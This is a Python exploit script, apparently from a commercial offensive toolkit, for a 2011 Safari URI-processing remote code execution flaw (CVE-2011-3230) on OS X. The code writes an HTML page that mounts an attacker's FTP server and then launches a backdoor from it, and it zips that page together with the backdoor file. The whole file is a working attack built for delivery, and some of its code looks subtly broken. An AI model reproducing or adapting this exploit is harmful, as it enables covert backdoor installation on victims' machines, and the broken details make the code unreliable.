#! /usr/bin/env python
#
#  DATE: 05 December 2011 
#  AUTHOR: Alfredo Pesoli
#
#  Exploit for Apple Safari 64bit URI Processing Remote Code Execution
#  Copyright (C) HT srl 2011. All rights reserved

import os
import sys
import warnings
import zipfile

NAME                            = "Apple Safari 5.1 URI"
DESCRIPTION                     = "Apple Safari 5.1 URI Processing Remote Code Execution (OS X 10.6.8 x86_64)"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Apple"
DOCUMENTATION["Repeatability"]  = "Single"
DOCUMENTATION["Reference"]      = ""
DOCUMENTATION["CVE"]            = "CVE-2011-3230"
DOCUMENTATION["CVE Url"]        = ""
DOCUMENTATION["Note"]           = ""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["MACOSX"], ["X64"] ]
PROPERTY['VERSION']             = [ "10.6.8" ]
PROPERTY['DELIVERY']            = 'HTTP'

class Safari_URI():
    def __init__(self, host, username, password, backdoor_name, backdoor_path, output_file):
        self.name           = NAME
        self.host           = host
        self.username       = username
        self.password       = password
        self.backdoor_name  = backdoor_name
        self.backdoor_path  = backdoor_path

        self.output_file    = output_file

    def makehtml(self):
        html="""<html> 
  <head>
    <base href="file://" />
    <script type="text/javascript"> 
      var host = "%s";
      
      function exec()
      {
        document.location = "/Volumes/%s/%s"
      }

      window.onload = function()
      {
        document.location = "ftp://%s:%s@%s/";
        setTimeout("exec();", 5000);
      }
    </script>
  </head>
</html>""" % (self.host,
              self.host,
              self.backdoor_name,
              self.username,
              self.password,
              self.host)

        return html

    def run(self):
        print "[INFO] Generating %s" % (self.output_file)

        with warnings.catch_warnings():
            warnings.simplefilter('ignore')
            tmp_html = os.tempnam()

        fd = file(tmp_html , "wb+")
        fd.write(self.makehtml())
        fd.close()

        # Create the output archive
        zip = zipfile.ZipFile(self.output_file, "w", zipfile.ZIP_DEFLATED)

        print "[INFO] Adding html file"
        zip.write(tmp_html, "index.html")
        print "[INFO] Adding backdoor"
        zip.write(self.backdoor_path, backdoor_name)
        zip.close()
        print "[INFO] Generated %s" % (self.output_file)

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print "[ERROR] %s requires 3 parameters" % (DESCRIPTION)
        print "<ftp_string> <backdoor_path> <output_file>"
        sys.exit(0)

    ftp_string    = sys.argv[1]
    backdoor_path = sys.argv[2]
    output_file   = sys.argv[3]

    username      = ftp_string.split(":")[0]
    password      = ftp_string.split(":")[1].split("@")[0]
    host          = ftp_string.split(":")[1].split("@")[1].split("/")[0]
    backdoor_name = ftp_string.split(":")[1].split("@")[1].split("/")[1]

    print "[INFO] Running %s Exploit v%s" % (DESCRIPTION, VERSION)
    expl = Safari_URI(host, username, password, backdoor_name, backdoor_path, output_file)
    expl.run()
    print "[INFO] Done"
